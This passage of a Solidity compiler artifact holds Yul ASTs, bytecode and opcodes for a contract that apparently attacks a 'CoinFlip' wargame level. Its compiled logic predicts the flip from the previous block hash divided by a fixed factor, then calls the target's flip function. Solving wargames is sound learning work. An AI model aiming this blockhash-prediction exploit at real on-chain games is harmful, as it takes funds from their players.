															"src": "305:128:2",
															"statements": [
																{
																	"nodeType": "YulVariableDeclaration",
																	"src": "320:15:2",
																	"value": {
																		"kind": "number",
																		"nodeType": "YulLiteral",
																		"src": "334:1:2",
																		"type": "",
																		"value": "0"
																	},
																	"variables": [
																		{
																			"name": "offset",
																			"nodeType": "YulTypedName",
																			"src": "324:6:2",
																			"type": ""
																		}
																	]
																},
																{
																	"nodeType": "YulAssignment",
																	"src": "349:74:2",
																	"value": {
																		"arguments": [
																			{
																				"arguments": [
																					{
																						"name": "headStart",
																						"nodeType": "YulIdentifier",
																						"src": "395:9:2"
																					},
																					{
																						"name": "offset",
																						"nodeType": "YulIdentifier",
																						"src": "406:6:2"
																					}
																				],
																				"functionName": {
																					"name": "add",
																					"nodeType": "YulIdentifier",
																					"src": "391:3:2"
																				},
																				"nodeType": "YulFunctionCall",
																				"src": "391:22:2"
																			},
																			{
																				"name": "dataEnd",
																				"nodeType": "YulIdentifier",
																				"src": "415:7:2"
																			}
																		],
																		"functionName": {
																			"name": "abi_decode_t_address_fromMemory",
																			"nodeType": "YulIdentifier",
																			"src": "359:31:2"
																		},
																		"nodeType": "YulFunctionCall",
																		"src": "359:64:2"
																	},
																	"variableNames": [
																		{
																			"name": "value0",
																			"nodeType": "YulIdentifier",
																			"src": "349:6:2"
																		}
																	]
																}
															]
														}
													]
												},
												"name": "abi_decode_tuple_t_address_fromMemory",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "headStart",
														"nodeType": "YulTypedName",
														"src": "203:9:2",
														"type": ""
													},
													{
														"name": "dataEnd",
														"nodeType": "YulTypedName",
														"src": "214:7:2",
														"type": ""
													}
												],
												"returnVariables": [
													{
														"name": "value0",
														"nodeType": "YulTypedName",
														"src": "226:6:2",
														"type": ""
													}
												],
												"src": "156:284:2"
											},
											{
												"body": {
													"nodeType": "YulBlock",
													"src": "491:51:2",
													"statements": [
														{
															"nodeType": "YulAssignment",
															"src": "501:35:2",
															"value": {
																"arguments": [
																	{
																		"name": "value",
																		"nodeType": "YulIdentifier",
																		"src": "530:5:2"
																	}
																],
																"functionName": {
																	"name": "cleanup_t_uint160",
																	"nodeType": "YulIdentifier",
																	"src": "512:17:2"
																},
																"nodeType": "YulFunctionCall",
																"src": "512:24:2"
															},
															"variableNames": [
																{
																	"name": "cleaned",
																	"nodeType": "YulIdentifier",
																	"src": "501:7:2"
																}
															]
														}
													]
												},
												"name": "cleanup_t_address",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "value",
														"nodeType": "YulTypedName",
														"src": "473:5:2",
														"type": ""
													}
												],
												"returnVariables": [
													{
														"name": "cleaned",
														"nodeType": "YulTypedName",
														"src": "483:7:2",
														"type": ""
													}
												],
												"src": "446:96:2"
											},
											{
												"body": {
													"nodeType": "YulBlock",
													"src": "593:81:2",
													"statements": [
														{
															"nodeType": "YulAssignment",
															"src": "603:65:2",
															"value": {
																"arguments": [
																	{
																		"name": "value",
																		"nodeType": "YulIdentifier",
																		"src": "618:5:2"
																	},
																	{
																		"kind": "number",
																		"nodeType": "YulLiteral",
																		"src": "625:42:2",
																		"type": "",
																		"value": "0xffffffffffffffffffffffffffffffffffffffff"
																	}
																],
																"functionName": {
																	"name": "and",
																	"nodeType": "YulIdentifier",
																	"src": "614:3:2"
																},
																"nodeType": "YulFunctionCall",
																"src": "614:54:2"
															},
															"variableNames": [
																{
																	"name": "cleaned",
																	"nodeType": "YulIdentifier",
																	"src": "603:7:2"
																}
															]
														}
													]
												},
												"name": "cleanup_t_uint160",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "value",
														"nodeType": "YulTypedName",
														"src": "575:5:2",
														"type": ""
													}
												],
												"returnVariables": [
													{
														"name": "cleaned",
														"nodeType": "YulTypedName",
														"src": "585:7:2",
														"type": ""
													}
												],
												"src": "548:126:2"
											},
											{
												"body": {
													"nodeType": "YulBlock",
													"src": "723:79:2",
													"statements": [
														{
															"body": {
																"nodeType": "YulBlock",
																"src": "780:16:2",
																"statements": [
																	{
																		"expression": {
																			"arguments": [
																				{
																					"kind": "number",
																					"nodeType": "YulLiteral",
																					"src": "789:1:2",
																					"type": "",
																					"value": "0"
																				},
																				{
																					"kind": "number",
																					"nodeType": "YulLiteral",
																					"src": "792:1:2",
																					"type": "",
																					"value": "0"
																				}
																			],
																			"functionName": {
																				"name": "revert",
																				"nodeType": "YulIdentifier",
																				"src": "782:6:2"
																			},
																			"nodeType": "YulFunctionCall",
																			"src": "782:12:2"
																		},
																		"nodeType": "YulExpressionStatement",
																		"src": "782:12:2"
																	}
																]
															},
															"condition": {
																"arguments": [
																	{
																		"arguments": [
																			{
																				"name": "value",
																				"nodeType": "YulIdentifier",
																				"src": "746:5:2"
																			},
																			{
																				"arguments": [
																					{
																						"name": "value",
																						"nodeType": "YulIdentifier",
																						"src": "771:5:2"
																					}
																				],
																				"functionName": {
																					"name": "cleanup_t_address",
																					"nodeType": "YulIdentifier",
																					"src": "753:17:2"
																				},
																				"nodeType": "YulFunctionCall",
																				"src": "753:24:2"
																			}
																		],
																		"functionName": {
																			"name": "eq",
																			"nodeType": "YulIdentifier",
																			"src": "743:2:2"
																		},
																		"nodeType": "YulFunctionCall",
																		"src": "743:35:2"
																	}
																],
																"functionName": {
																	"name": "iszero",
																	"nodeType": "YulIdentifier",
																	"src": "736:6:2"
																},
																"nodeType": "YulFunctionCall",
																"src": "736:43:2"
															},
															"nodeType": "YulIf",
															"src": "733:2:2"
														}
													]
												},
												"name": "validator_revert_t_address",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "value",
														"nodeType": "YulTypedName",
														"src": "716:5:2",
														"type": ""
													}
												],
												"src": "680:122:2"
											}
										]
									},
									"contents": "{\n\n    function abi_decode_t_address_fromMemory(offset, end) -> value {\n        value := mload(offset)\n        validator_revert_t_address(value)\n    }\n\n    function abi_decode_tuple_t_address_fromMemory(headStart, dataEnd) -> value0 {\n        if slt(sub(dataEnd, headStart), 32) { revert(0, 0) }\n\n        {\n\n            let offset := 0\n\n            value0 := abi_decode_t_address_fromMemory(add(headStart, offset), dataEnd)\n        }\n\n    }\n\n    function cleanup_t_address(value) -> cleaned {\n        cleaned := cleanup_t_uint160(value)\n    }\n\n    function cleanup_t_uint160(value) -> cleaned {\n        cleaned := and(value, 0xffffffffffffffffffffffffffffffffffffffff)\n    }\n\n    function validator_revert_t_address(value) {\n        if iszero(eq(value, cleanup_t_address(value))) { revert(0, 0) }\n    }\n\n}\n",
									"id": 2,
									"language": "Yul",
									"name": "#utility.yul"
								}
							],
							"linkReferences": {},
							"object": "60806040527f800000000000000000000000000000000000000000000000000000000000000060015534801561003457600080fd5b506040516104a33803806104a3833981810160405281019061005691906100b1565b806000806101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff16021790555050610123565b6000815190506100ab8161010c565b92915050565b6000602082840312156100c357600080fd5b60006100d18482850161009c565b91505092915050565b60006100e5826100ec565b9050919050565b600073ffffffffffffffffffffffffffffffffffffffff82169050919050565b610115816100da565b811461012057600080fd5b50565b610371806101326000396000f3fe608060405234801561001057600080fd5b50600436106100365760003560e01c806353b3b3b31461003b578063931c9f3214610059575b600080fd5b610043610063565b60405161005091906101ec565b60405180910390f35b610061610087565b005b60008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1681565b60006001436100969190610238565b4060001c90506000600154826100ac9190610207565b90506000600182146100bf5760006100c2565b60015b905060008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16631d263f67826040518263ffffffff1660e01b815260040161011d91906101d1565b602060405180830381600087803b15801561013757600080fd5b505af115801561014b573d6000803e3d6000fd5b505050506040513d601f19601f8201168201806040525081019061016f919061018a565b50505050565b60008151905061018481610324565b92915050565b60006020828403121561019c57600080fd5b60006101aa84828501610175565b91505092915050565b6101bc8161026c565b82525050565b6101cb816102a2565b82525050565b60006020820190506101e660008301846101b3565b92915050565b600060208201905061020160008301846101c2565b92915050565b600061021282610298565b915061021d83610298565b92508261022d5761022c6102f5565b5b828204905092915050565b600061024382610298565b915061024e83610298565b925082821015610261576102606102c6565b5b828203905092915050565b60008115159050919050565b600073ffffffffffffffffffffffffffffffffffffffff82169050919050565b6000819050919050565b60006102ad826102b4565b9050919050565b60006102bf82610278565b9050919050565b7f4e487b7100000000000000000000000000000000000000000000000000000000600052601160045260246000fd5b7f4e487b7100000000000000000000000000000000000000000000000000000000600052601260045260246000fd5b61032d8161026c565b811461033857600080fd5b5056fea2646970667358221220543d1d06066c46476da9229d6d949d3ccab3a77528281795b03d89c9bb2ead3d64736f6c63430008000033",
							"opcodes": "PUSH1 0x80 PUSH1 0x40 MSTORE PUSH32 0x8000000000000000000000000000000000000000000000000000000000000000 PUSH1 0x1 SSTORE CALLVALUE DUP1 ISZERO PUSH2 0x34 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH1 0x40 MLOAD PUSH2 0x4A3 CODESIZE SUB DUP1 PUSH2 0x4A3 DUP4 CODECOPY DUP2 DUP2 ADD PUSH1 0x40 MSTORE DUP2 ADD SWAP1 PUSH2 0x56 SWAP2 SWAP1 PUSH2 0xB1 JUMP JUMPDEST DUP1 PUSH1 0x0 DUP1 PUSH2 0x100 EXP DUP2 SLOAD DUP2 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF MUL NOT AND SWAP1 DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND MUL OR SWAP1 SSTORE POP POP PUSH2 0x123 JUMP JUMPDEST PUSH1 0x0 DUP2 MLOAD SWAP1 POP PUSH2 0xAB DUP2 PUSH2 0x10C JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 DUP5 SUB SLT ISZERO PUSH2 0xC3 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH1 0x0 PUSH2 0xD1 DUP5 DUP3 DUP6 ADD PUSH2 0x9C JUMP JUMPDEST SWAP2 POP POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0xE5 DUP3 PUSH2 0xEC JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF DUP3 AND SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH2 0x115 DUP2 PUSH2 0xDA JUMP JUMPDEST DUP2 EQ PUSH2 0x120 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP JUMP JUMPDEST PUSH2 0x371 DUP1 PUSH2 0x132 PUSH1 0x0 CODECOPY PUSH1 0x0 RETURN INVALID PUSH1 0x80 PUSH1 0x40 MSTORE CALLVALUE DUP1 ISZERO PUSH2 0x10 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH1 0x4 CALLDATASIZE LT PUSH2 0x36 JUMPI PUSH1 0x0 CALLDATALOAD PUSH1 0xE0 SHR DUP1 PUSH4 0x53B3B3B3 EQ PUSH2 0x3B JUMPI DUP1 PUSH4 0x931C9F32 EQ PUSH2 0x59 JUMPI JUMPDEST PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH2 0x43 PUSH2 0x63 JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH2 0x50 SWAP2 SWAP1 PUSH2 0x1EC JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH2 0x61 PUSH2 0x87 JUMP JUMPDEST STOP JUMPDEST PUSH1 0x0 DUP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 JUMP JUMPDEST PUSH1 0x0 PUSH1 0x1 NUMBER PUSH2 0x96 SWAP2 SWAP1 PUSH2 0x238 JUMP JUMPDEST BLOCKHASH PUSH1 0x0 SHR SWAP1 POP PUSH1 0x0 PUSH1 0x1 SLOAD DUP3 PUSH2 0xAC SWAP2 SWAP1 PUSH2 0x207 JUMP JUMPDEST SWAP1 POP PUSH1 0x0 PUSH1 0x1 DUP3 EQ PUSH2 0xBF JUMPI PUSH1 0x0 PUSH2 0xC2 JUMP JUMPDEST PUSH1 0x1 JUMPDEST SWAP1 POP PUSH1 0x0 DUP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH4 0x1D263F67 DUP3 PUSH1 0x40 MLOAD DUP3 PUSH4 0xFFFFFFFF AND PUSH1 0xE0 SHL DUP2 MSTORE PUSH1 0x4 ADD PUSH2 0x11D SWAP2 SWAP1 PUSH2 0x1D1 JUMP JUMPDEST PUSH1 0x20 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 PUSH1 0x0 DUP8 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0x137 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP GAS CALL ISZERO DUP1 ISZERO PUSH2 0x14B JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP PUSH1 0x40 MLOAD RETURNDATASIZE PUSH1 0x1F NOT PUSH1 0x1F DUP3 ADD AND DUP3 ADD DUP1 PUSH1 0x40 MSTORE POP DUP2 ADD SWAP1 PUSH2 0x16F SWAP2 SWAP1 PUSH2 0x18A JUMP JUMPDEST POP POP POP POP JUMP JUMPDEST PUSH1 0x0 DUP2 MLOAD SWAP1 POP PUSH2 0x184 DUP2 PUSH2 0x324 JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 DUP5 SUB SLT ISZERO PUSH2 0x19C JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH1 0x0 PUSH2 0x1AA DUP5 DUP3 DUP6 ADD PUSH2 0x175 JUMP JUMPDEST SWAP2 POP POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH2 0x1BC DUP2 PUSH2 0x26C JUMP JUMPDEST DUP3 MSTORE POP POP JUMP JUMPDEST PUSH2 0x1CB DUP2 PUSH2 0x2A2 JUMP JUMPDEST DUP3 MSTORE POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 ADD SWAP1 POP PUSH2 0x1E6 PUSH1 0x0 DUP4 ADD DUP5 PUSH2 0x1B3 JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 ADD SWAP1 POP PUSH2 0x201 PUSH1 0x0 DUP4 ADD DUP5 PUSH2 0x1C2 JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x212 DUP3 PUSH2 0x298 JUMP JUMPDEST SWAP2 POP PUSH2 0x21D DUP4 PUSH2 0x298 JUMP JUMPDEST SWAP3 POP DUP3 PUSH2 0x22D JUMPI PUSH2 0x22C PUSH2 0x2F5 JUMP JUMPDEST JUMPDEST DUP3 DUP3 DIV SWAP1 POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x243 DUP3 PUSH2 0x298 JUMP JUMPDEST SWAP2 POP PUSH2 0x24E DUP4 PUSH2 0x298 JUMP JUMPDEST SWAP3 POP DUP3 DUP3 LT ISZERO PUSH2 0x261 JUMPI PUSH2 0x260 PUSH2 0x2C6 JUMP JUMPDEST JUMPDEST DUP3 DUP3 SUB SWAP1 POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 DUP2 ISZERO ISZERO SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF DUP3 AND SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 DUP2 SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x2AD DUP3 PUSH2 0x2B4 JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x2BF DUP3 PUSH2 0x278 JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH32 0x4E487B7100000000000000000000000000000000000000000000000000000000 PUSH1 0x0 MSTORE PUSH1 0x11 PUSH1 0x4 MSTORE PUSH1 0x24 PUSH1 0x0 REVERT JUMPDEST PUSH32 0x4E487B7100000000000000000000000000000000000000000000000000000000 PUSH1 0x0 MSTORE PUSH1 0x12 PUSH1 0x4 MSTORE PUSH1 0x24 PUSH1 0x0 REVERT JUMPDEST PUSH2 0x32D DUP2 PUSH2 0x26C JUMP JUMPDEST DUP2 EQ PUSH2 0x338 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP JUMP INVALID LOG2 PUSH5 0x6970667358 0x22 SLT KECCAK256 SLOAD RETURNDATASIZE SAR MOD MOD PUSH13 0x46476DA9229D6D949D3CCAB3A7 PUSH22 0x28281795B03D89C9BB2EAD3D64736F6C634300080000 CALLER ",
							"sourceMap": "86:535:1:-:0;;;172:77;155:94;;258:110;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;:::i;:::-;342:17;314:16;;:46;;;;;;;;;;;;;;;;;;258:110;86:535;;7:143:2;;95:6;89:13;80:22;;111:33;138:5;111:33;:::i;:::-;70:80;;;;:::o;156:284::-;;275:2;263:9;254:7;250:23;246:32;243:2;;;291:1;288;281:12;243:2;334:1;359:64;415:7;406:6;395:9;391:22;359:64;:::i;:::-;349:74;;305:128;233:207;;;;:::o;446:96::-;;512:24;530:5;512:24;:::i;:::-;501:35;;491:51;;;:::o;548:126::-;;625:42;618:5;614:54;603:65;;593:81;;;:::o;680:122::-;753:24;771:5;753:24;:::i;:::-;746:5;743:35;733:2;;792:1;789;782:12;733:2;723:79;:::o;86:535:1:-;;;;;;;"
						},
						"deployedBytecode": {
							"generatedSources": [
								{
									"ast": {
										"nodeType": "YulBlock",
										"src": "0:2676:2",
										"statements": [
											{
												"body": {
													"nodeType": "YulBlock",
													"src": "67:77:2",
													"statements": [
														{
															"nodeType": "YulAssignment",
															"src": "77:22:2",
															"value": {
																"arguments": [
																	{
																		"name": "offset",
																		"nodeType": "YulIdentifier",
																		"src": "92:6:2"
																	}
																],
																"functionName": {
																	"name": "mload",
																	"nodeType": "YulIdentifier",
																	"src": "86:5:2"
																},
																"nodeType": "YulFunctionCall",
																"src": "86:13:2"
															},
															"variableNames": [
																{
																	"name": "value",
																	"nodeType": "YulIdentifier",
																	"src": "77:5:2"
																}
															]
														},
														{
															"expression": {
																"arguments": [
																	{
																		"name": "value",
																		"nodeType": "YulIdentifier",
																		"src": "132:5:2"
																	}
																],
																"functionName": {
																	"name": "validator_revert_t_bool",
																	"nodeType": "YulIdentifier",
																	"src": "108:23:2"
																},
																"nodeType": "YulFunctionCall",
																"src": "108:30:2"
															},
															"nodeType": "YulExpressionStatement",
															"src": "108:30:2"
														}
													]
												},
												"name": "abi_decode_t_bool_fromMemory",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "offset",
														"nodeType": "YulTypedName",
														"src": "45:6:2",
														"type": ""
													},
													{
														"name": "end",
														"nodeType": "YulTypedName",
														"src": "53:3:2",
														"type": ""
													}
												],
												"returnVariables": [
													{
														"name": "value",
														"nodeType": "YulTypedName",
														"src": "61:5:2",
														"type": ""
													}
												],
												"src": "7:137:2"
											},
											{
												"body": {
													"nodeType": "YulBlock",
													"src": "224:204:2",
													"statements": [
														{
															"body": {
																"nodeType": "YulBlock",
																"src": "270:16:2",
																"statements": [
																	{
																		"expression": {
																			"arguments": [
																				{
																					"kind": "number",
																					"nodeType": "YulLiteral",
																					"src": "279:1:2",
																					"type": "",
																					"value": "0"
																				},
																				{
																					"kind": "number",
																					"nodeType": "YulLiteral",
																					"src": "282:1:2",
																					"type": "",
																					"value": "0"
																				}
																			],
																			"functionName": {
																				"name": "revert",
																				"nodeType": "YulIdentifier",
																				"src": "272:6:2"
																			},
																			"nodeType": "YulFunctionCall",
																			"src": "272:12:2"
																		},
																		"nodeType": "YulExpressionStatement",
																		"src": "272:12:2"
																	}
																]
															},
															"condition": {
																"arguments": [
																	{
																		"arguments": [
																			{
																				"name": "dataEnd",
																				"nodeType": "YulIdentifier",
																				"src": "245:7:2"
																			},
																			{
																				"name": "headStart",
																				"nodeType": "YulIdentifier",
																				"src": "254:9:2"
																			}
																		],
																		"functionName": {
																			"name": "sub",
																			"nodeType": "YulIdentifier",
																			"src": "241:3:2"
																		},
																		"nodeType": "YulFunctionCall",
																		"src": "241:23:2"
																	},
																	{
																		"kind": "number",
																		"nodeType": "YulLiteral",
																		"src": "266:2:2",
																		"type": "",
																		"value": "32"
																	}
																],
																"functionName": {
																	"name": "slt",
																	"nodeType": "YulIdentifier",
																	"src": "237:3:2"
																},
																"nodeType": "YulFunctionCall",
																"src": "237:32:2"
															},
															"nodeType": "YulIf",
															"src": "234:2:2"
														},
														{
															"nodeType": "YulBlock",
															"src": "296:125:2",
															"statements": [
																{
																	"nodeType": "YulVariableDeclaration",
																	"src": "311:15:2",
																	"value": {
																		"kind": "number",
																		"nodeType": "YulLiteral",
																		"src": "325:1:2",
																		"type": "",
																		"value": "0"
																	},
																	"variables": [
																		{
																			"name": "offset",
																			"nodeType": "YulTypedName",
																			"src": "315:6:2",
																			"type": ""
																		}
																	]
																},
																{
																	"nodeType": "YulAssignment",
																	"src": "340:71:2",
																	"value": {
																		"arguments": [
																			{
																				"arguments": [
																					{
																						"name": "headStart",
																						"nodeType": "YulIdentifier",
																						"src": "383:9:2"
																					},
																					{
																						"name": "offset",
																						"nodeType": "YulIdentifier",
																						"src": "394:6:2"
																					}
																				],
																				"functionName": {
																					"name": "add",
																					"nodeType": "YulIdentifier",
																					"src": "379:3:2"
																				},
																				"nodeType": "YulFunctionCall",
																				"src": "379:22:2"
																			},
																			{
																				"name": "dataEnd",
																				"nodeType": "YulIdentifier",
																				"src": "403:7:2"
																			}
																		],
																		"functionName": {
																			"name": "abi_decode_t_bool_fromMemory",
																			"nodeType": "YulIdentifier",
																			"src": "350:28:2"
																		},
																		"nodeType": "YulFunctionCall",
																		"src": "350:61:2"
																	},
																	"variableNames": [
																		{
																			"name": "value0",
																			"nodeType": "YulIdentifier",
																			"src": "340:6:2"
																		}
																	]
																}
															]
														}
													]
												},
												"name": "abi_decode_tuple_t_bool_fromMemory",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "headStart",
														"nodeType": "YulTypedName",
														"src": "194:9:2",
														"type": ""
													},
													{
														"name": "dataEnd",
														"nodeType": "YulTypedName",
														"src": "205:7:2",
														"type": ""
													}
												],
												"returnVariables": [
													{
														"name": "value0",
														"nodeType": "YulTypedName",
														"src": "217:6:2",
														"type": ""
													}
												],
												"src": "150:278:2"
											},
											{
												"body": {
													"nodeType": "YulBlock",
													"src": "493:50:2",
													"statements": [
														{
															"expression": {
																"arguments": [
																	{
																		"name": "pos",
																		"nodeType": "YulIdentifier",
																		"src": "510:3:2"
																	},
																	{
																		"arguments": [
																			{
																				"name": "value",
																				"nodeType": "YulIdentifier",
																				"src": "530:5:2"
																			}
																		],
																		"functionName": {
																			"name": "cleanup_t_bool",
																			"nodeType": "YulIdentifier",
																			"src": "515:14:2"
																		},
																		"nodeType": "YulFunctionCall",
																		"src": "515:21:2"
																	}
																],
																"functionName": {
																	"name": "mstore",
																	"nodeType": "YulIdentifier",
																	"src": "503:6:2"
																},
																"nodeType": "YulFunctionCall",
																"src": "503:34:2"
															},
															"nodeType": "YulExpressionStatement",
															"src": "503:34:2"
														}
													]
												},
												"name": "abi_encode_t_bool_to_t_bool_fromStack",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "value",
														"nodeType": "YulTypedName",
														"src": "481:5:2",
														"type": ""
													},
													{
														"name": "pos",
														"nodeType": "YulTypedName",
														"src": "488:3:2",
														"type": ""
													}
												],
												"src": "434:109:2"
											},
											{
												"body": {
													"nodeType": "YulBlock",
													"src": "629:81:2",
													"statements": [
														{
															"expression": {
																"arguments": [
																	{
																		"name": "pos",
																		"nodeType": "YulIdentifier",
																		"src": "646:3:2"
																	},
																	{
																		"arguments": [
																			{
																				"name": "value",
																				"nodeType": "YulIdentifier",
																				"src": "697:5:2"
																			}
																		],
																		"functionName": {
																			"name": "convert_t_contract$_CoinFlip_$81_to_t_address",
																			"nodeType": "YulIdentifier",
																			"src": "651:45:2"
																		},
																		"nodeType": "YulFunctionCall",
																		"src": "651:52:2"
																	}
																],
																"functionName": {
																	"name": "mstore",
																	"nodeType": "YulIdentifier",
																	"src": "639:6:2"
																},
																"nodeType": "YulFunctionCall",
																"src": "639:65:2"
															},
															"nodeType": "YulExpressionStatement",
															"src": "639:65:2"
														}
													]
												},
												"name": "abi_encode_t_contract$_CoinFlip_$81_to_t_address_fromStack",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "value",
														"nodeType": "YulTypedName",
														"src": "617:5:2",
														"type": ""
													},
													{
														"name": "pos",
														"nodeType": "YulTypedName",
														"src": "624:3:2",
														"type": ""
													}
												],
												"src": "549:161:2"
											},
											{
												"body": {
													"nodeType": "YulBlock",
													"src": "808:118:2",
													"statements": [
														{
															"nodeType": "YulAssignment",
															"src": "818:26:2",
															"value": {
																"arguments": [
																	{
																		"name": "headStart",
																		"nodeType": "YulIdentifier",
																		"src": "830:9:2"
																	},
																	{
																		"kind": "number",
																		"nodeType": "YulLiteral",
																		"src": "841:2:2",
																		"type": "",
																		"value": "32"
																	}
																],
																"functionName": {
																	"name": "add",
																	"nodeType": "YulIdentifier",
																	"src": "826:3:2"
																},
																"nodeType": "YulFunctionCall",
																"src": "826:18:2"
															},
															"variableNames": [
																{
																	"name": "tail",
																	"nodeType": "YulIdentifier",
																	"src": "818:4:2"
																}
															]
														},
														{
															"expression": {
																"arguments": [
																	{
																		"name": "value0",
																		"nodeType": "YulIdentifier",
																		"src": "892:6:2"
																	},
																	{
																		"arguments": [
																			{
																				"name": "headStart",
																				"nodeType": "YulIdentifier",
																				"src": "905:9:2"
																			},
																			{
																				"kind": "number",
																				"nodeType": "YulLiteral",
																				"src": "916:1:2",
																				"type": "",
																				"value": "0"
																			}
																		],
																		"functionName": {
																			"name": "add",
																			"nodeType": "YulIdentifier",
																			"src": "901:3:2"
																		},
																		"nodeType": "YulFunctionCall",
																		"src": "901:17:2"
																	}
																],
																"functionName": {
																	"name": "abi_encode_t_bool_to_t_bool_fromStack",
																	"nodeType": "YulIdentifier",
																	"src": "854:37:2"
																},
																"nodeType": "YulFunctionCall",
																"src": "854:65:2"
															},
															"nodeType": "YulExpressionStatement",
															"src": "854:65:2"
														}
													]
												},
												"name": "abi_encode_tuple_t_bool__to_t_bool__fromStack_reversed",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "headStart",
														"nodeType": "YulTypedName",
														"src": "780:9:2",
														"type": ""
													},
													{
														"name": "value0",
														"nodeType": "YulTypedName",
														"src": "792:6:2",
														"type": ""
													}
												],
												"returnVariables": [
													{
														"name": "tail",
														"nodeType": "YulTypedName",
														"src": "803:4:2",
														"type": ""
													}
												],
												"src": "716:210:2"
											},
											{
												"body": {
													"nodeType": "YulBlock",
													"src": "1045:139:2",
													"statements": [
														{
															"nodeType": "YulAssignment",
															"src": "1055:26:2",
															"value": {
																"arguments": [
																	{
																		"name": "headStart",
																		"nodeType": "YulIdentifier",
																		"src": "1067:9:2"
																	},
																	{
																		"kind": "number",
																		"nodeType": "YulLiteral",
																		"src": "1078:2:2",
																		"type": "",
																		"value": "32"
																	}
																],
																"functionName": {
																	"name": "add",
																	"nodeType": "YulIdentifier",
																	"src": "1063:3:2"
																},
																"nodeType": "YulFunctionCall",
																"src": "1063:18:2"
															},
															"variableNames": [
																{
																	"name": "tail",
																	"nodeType": "YulIdentifier",
																	"src": "1055:4:2"
																}
															]
														},
														{
															"expression": {
																"arguments": [
																	{
																		"name": "value0",
																		"nodeType": "YulIdentifier",
																		"src": "1150:6:2"
																	},
																	{
																		"arguments": [
																			{
																				"name": "headStart",
																				"nodeType": "YulIdentifier",
																				"src": "1163:9:2"
																			},
																			{
																				"kind": "number",
																				"nodeType": "YulLiteral",
																				"src": "1174:1:2",
																				"type": "",
																				"value": "0"
																			}
																		],
																		"functionName": {
																			"name": "add",
																			"nodeType": "YulIdentifier",
																			"src": "1159:3:2"
																		},
																		"nodeType": "YulFunctionCall",
																		"src": "1159:17:2"
																	}
																],
																"functionName": {
																	"name": "abi_encode_t_contract$_CoinFlip_$81_to_t_address_fromStack",
																	"nodeType": "YulIdentifier",
																	"src": "1091:58:2"
																},
																"nodeType": "YulFunctionCall",
																"src": "1091:86:2"
															},
															"nodeType": "YulExpressionStatement",
															"src": "1091:86:2"
														}
													]
												},
												"name": "abi_encode_tuple_t_contract$_CoinFlip_$81__to_t_address__fromStack_reversed",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "headStart",
														"nodeType": "YulTypedName",
														"src": "1017:9:2",
														"type": ""
													},
													{
														"name": "value0",
														"nodeType": "YulTypedName",
														"src": "1029:6:2",
														"type": ""
